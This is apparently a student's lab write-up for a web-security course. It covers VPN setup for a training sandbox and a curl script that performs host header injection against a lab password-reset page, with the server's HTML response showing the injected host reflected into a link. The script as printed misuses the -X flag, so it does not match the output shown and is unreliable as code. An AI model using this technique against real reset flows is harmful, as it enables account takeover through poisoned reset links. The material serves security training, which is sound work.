# Web Fundamentals


## Task 0 - Welcome



### Start cyber_websec_0x00


- Hostname: web-0-80-23.cod-eu-west-3.hbtn.io
- Local IP: 10.42.80.23






```bash
# put ip in /etc/hosts
sudo vim /etc/hosts

# check
cat /etc/hosts | grep web0x00.*
# 10.42.80.23     web0x00.hbtn
```

- start openvpn
- useful aliases in `.zshrc`
  ```bash
  ovi='sudo openvpn --config ~/sandbox.ovpn --daemon'
  ovc='ps aux | grep [o]penvpn;ip route'
  ovkill='sudo pkill openvpn'
  ```
- start openvpn
  ```bash
  ovc
  # default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100 
  # 10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 

  ovi
  # 2026-10-02 04:56:08 DEPRECATED OPTION: --persist-key option ignored. Keys are now always persisted across restarts. 

  ovc
  # root       27060  0.1  0.0  16060  9808 ?        Ss   04:56   0:00 openvpn --config /home/kali/sandbox.ovpn --daemon
  # default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100 
  # 10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 
  # 10.8.0.0/24 dev tun0 proto kernel scope link src 10.8.0.2 
  # 10.42.0.0/16 via 10.8.0.1 dev tun0 metric 200 
  ```


## 1. Task 1 - Can We Trust Our Hosts?

Write a `bash` script that exploit host header injection using `curl`.

Initial Endpoint : http://web0x00.hbtn/reset_password

Your script should accept the `NEW HOST` as ARG 1 (`"$1"`).

Your script should accept the `TARGET URL` as ARG 2 (`"$2"`).

Your script should accept the `FORM DATA` as ARG 3 (`"$3"`).

```bash
cat 1-host_header_injection.sh     
# #!/bin/bash
# curl -X -H "Host: $1" -d "$3" "$2"
```

```bash
./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password email=test@test.hbtn
# <!-- 
# Proudly made by Campusna Sec Team:
#         Yosri <yosri@web0x00.hbtn>
#         Maroua <maroua@web0x00.hbtn>
#         Abdou <abdou@web0x00.hbtn>
# -->
# <!DOCTYPE html>
# <html>
#         <head>
# 
#                 <meta charset="utf-8" />
#             <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
#             <meta name="description" content="Support Center | 0x00. Web Fundamentals" />
#             <meta name="author" content="Yosri.me" />
#             <title>Support Center | 0x00. Web Fundamentals</title>
#             <link href="/static/css/base.css" rel="stylesheet" />
#             <link href="/static/img/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
#           
#         </head>
#         <body>
#                 <header>
#                         <img src="/static/img/logo.png" />
#                         <h2></h2>
#                         <div style="width: 120px;"></div>
#                 </header>
#                 <main>
# 
#                 <form method="POST">
#                         <div class="login_box">
#                                 <h1>Reset Password</h1>
#                                 <div class="input_box">
#                                         <img src="/static/img/user.png" />
#                                         <input type="email" name="email" placeholder="Email Address" autocomplete="true" />
#                                 </div>
#                                 <div class="alert_box">
# 
# 
#                                                 <span>Email provided not found</span>
# 
# 
#                                 </div>
#                                 <button type="submit">Reset</button>
#                                 <a href="http://new_host/login">Try to sign in again ?</a>
#                         </div>
#                 </form>
# <!-- 
#         Last Modification made by: yosri
#         Don't forget to delete comments before production
# !-->
# 
#                 </main>
#                 <footer>
#                         &copy; 2023 Holberton School. All rights reserved. 
#                 </footer>
#         </body>
# </html>
```

